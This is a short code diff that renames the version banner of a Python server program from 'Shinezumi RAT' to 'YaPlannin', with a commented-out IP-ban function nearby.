@@ -19,7 +19,7 @@ def reloadconf(server, args):
 def version(server, args):
     """Shows version and build of running server."""
 
-    return f"Shinezumi RAT\nVersion: {VERSION_STRING}\nBuild: {BUILD}"
+    return f"YaPlannin\nVersion: {VERSION_STRING}\nBuild: {BUILD}"
 
 # def banhost(server, args):
 #     """Bans IP from accessing GUI."""
